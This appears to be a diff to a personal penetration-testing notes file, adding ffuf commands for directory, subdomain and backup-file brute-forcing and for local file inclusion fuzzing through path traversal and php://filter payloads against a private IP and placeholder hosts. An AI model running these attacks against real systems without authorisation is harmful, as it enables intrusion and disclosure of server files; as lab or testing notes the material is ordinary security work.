@@ -5,6 +5,20 @@ wfuzz -c -f re -w /SecLists/Discovery/DNS/subdomains-top1mil-5000.txt -u "http:/
 <br>
 <br>
 
+
+ffuf -b 'PHPSESSID=p8kcoc7avjam3v9i4sovt62gfa' -c -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://192.168.1.136/sea.php\?file\=../../../../FUZZ -fw 56
+<br>
+ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<TARGET_URL>/FUZZ -mc 200,204,301,302,307,401 -o results.txt
+<br>
+ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://<TARGET_URL>/ -H "Host: FUZZ.<TARGET_URL>" -fs 185
+<br>
+ffuf -c -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt -u http://<TARGET_URL>/backups/backup_2020070416FUZZ.zip
+<br>
+ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<TARGET_URL>/admin../admin_staging/index.php?page=FUZZ -fs 15349
+<br>
+<br>  
+<br>
+
  1565  ffuf -u 'http://lolol.thing/index.php?page=php://filter/convert.base64-encode/resource=../FUZZ/index' -w /usr/share/wfuzz/wordlist/webservices/ws-dirs.txt -fc 200
  <br>
  1567  ffuf -u 'http://lolol.thing/index.php?page=php://filter/convert.base64-encode/resource=../FUZZ/index' -w /usr/share/dirbuster/wordlists/directory-list-1.0.txt -fc 200
